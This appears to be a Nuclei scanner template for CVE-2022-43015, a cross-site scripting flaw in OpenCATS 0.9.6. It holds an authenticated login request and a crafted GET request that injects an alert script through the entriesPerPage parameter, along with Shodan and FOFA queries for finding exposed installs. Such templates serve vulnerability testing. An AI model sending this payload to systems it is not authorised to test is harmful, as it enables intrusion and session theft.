http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - <script>alert(document.domain)</script>
    - MySQL Query Failed
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /index.php?m=login&a=attemptLogin HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    username={{username}}&password={{password}}

    '
  - 'GET /ajax.php?f=getPipelineJobOrder&joborderID=2&page=0&entriesPerPage=15)"></a>%20<script>alert(document.domain)</script>&sortBy=dateCreatedInt&sortDirection=desc&indexFile=index.php&isPopup=0
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2022-43015
info:
  author: arafatansari
  classification:
    cpe: cpe:2.3:a:opencats:opencats:0.9.6:*:*:*:*:*:*:*
    cve-id: CVE-2022-43015
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.81691
    epss-score: 0.01677
  description: 'OpenCATS 0.9.6 contains a cross-site scripting vulnerability via the
    entriesPerPage parameter. An attacker can inject arbitrary script in the browser
    of an unsuspecting user in the context of the affected site. This can allow the
    attacker to steal cookie-based authentication credentials and launch other attacks.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary JavaScript code in the context of the victim''s browser, leading
    to potential data theft, session hijacking, or defacement of the affected website.

    '
  metadata:
    fofa-query: title="opencats"
    google-query: intitle:"opencats"
    max-request: 2
    product: opencats
    shodan-query:
    - title:"OpenCATS"
    - http.title:"opencats"
    vendor: opencats
    verified: true
  name: OpenCATS 0.9.6 - Cross-Site Scripting
  reference:
  - https://github.com/hansmach1ne/opencats_zero-days/blob/main/XSS_in_entriesPerPage.md
  - https://nvd.nist.gov/vuln/detail/CVE-2022-43015
  - https://github.com/ARPSyndicate/cvemon
  - https://github.com/ARPSyndicate/kenzer-templates
  - https://github.com/Henry4E36/POCS
  remediation: 'To mitigate this vulnerability, it is recommended to apply the latest
    security patches or upgrade to a newer version of OpenCATS that addresses this
    issue.

    '
  severity: medium
  tags: cve,cve2022,xss,opencats,authenticated,vuln
